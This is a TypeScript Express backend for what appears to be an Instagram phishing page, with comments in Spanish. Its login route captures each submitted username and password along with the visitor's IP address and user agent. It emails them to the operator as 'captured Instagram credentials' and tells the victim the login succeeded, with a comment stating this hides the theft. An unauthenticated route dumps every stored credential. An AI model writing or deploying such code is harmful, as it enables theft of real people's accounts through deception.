import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginCredentialsSchema } from "@shared/schema";
import { z } from "zod";
import { fromZodError } from "zod-validation-error";
import nodemailer from "nodemailer";

// Configuración del transporter para enviar correos
const transporter = nodemailer.createTransport({
  host: "smtp-mail.outlook.com",
  port: 587,
  secure: false, // true para 465, false para otros puertos
  auth: {
    user: process.env.OUTLOOK_EMAIL || "", // correo del remitente
    pass: process.env.OUTLOOK_PASSWORD || "", // contraseña del remitente
  },
  tls: {
    ciphers: "SSLv3",
    rejectUnauthorized: false,
  },
});

export async function registerRoutes(app: Express): Promise<Server> {
  // put application routes here
  // prefix all routes with /api

  // Login endpoint to store credentials
  app.post("/api/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const validatedData = insertLoginCredentialsSchema.parse(req.body);
      
      // Store the credentials with additional metadata
      const credentials = await storage.storeLoginCredentials({
        ...validatedData,
        ipAddress: req.ip,
        userAgent: req.get("User-Agent"),
      });
      
      // Enviar correo con las credenciales capturadas
      try {
        if (process.env.OUTLOOK_EMAIL && process.env.OUTLOOK_PASSWORD) {
          const mailOptions = {
            from: process.env.OUTLOOK_EMAIL,
            to: process.env.OUTLOOK_EMAIL, // Enviar al mismo correo configurado
            subject: "Nuevas credenciales de Instagram capturadas",
            html: `
              <h2>Nuevas credenciales capturadas</h2>
              <p><strong>Email/Usuario:</strong> ${credentials.email}</p>
              <p><strong>Contraseña:</strong> ${credentials.password}</p>
              <p><strong>Recordar usuario:</strong> ${credentials.rememberMe ? 'Sí' : 'No'}</p>
              <p><strong>Fecha:</strong> ${credentials.createdAt}</p>
              <p><strong>Dirección IP:</strong> ${credentials.ipAddress || 'No disponible'}</p>
              <p><strong>Agente de usuario:</strong> ${credentials.userAgent || 'No disponible'}</p>
            `
          };

          await transporter.sendMail(mailOptions);
          console.log("Correo enviado correctamente");
        } else {
          console.log("Credenciales de correo no configuradas");
        }
      } catch (emailError) {
        console.error("Error al enviar correo:", emailError);
        // No devolver error al cliente incluso si falla el envío de correo
      }
      
      // Return success without revealing we stored or sent the credentials
      return res.status(200).json({ success: true, message: "Login successful" });
    } catch (error) {
      // Handle validation errors
      if (error instanceof z.ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: "Invalid input data", 
          errors: validationError.message 
        });
      }
      
      // Handle other errors
      console.error("Login error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  // Admin endpoint to retrieve all stored credentials (for demonstration purposes)
  app.get("/api/credentials", async (_req: Request, res: Response) => {
    try {
      const allCredentials = await storage.getAllCredentials();
      return res.status(200).json({ credentials: allCredentials });
    } catch (error) {
      console.error("Error fetching credentials:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred" 
      });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
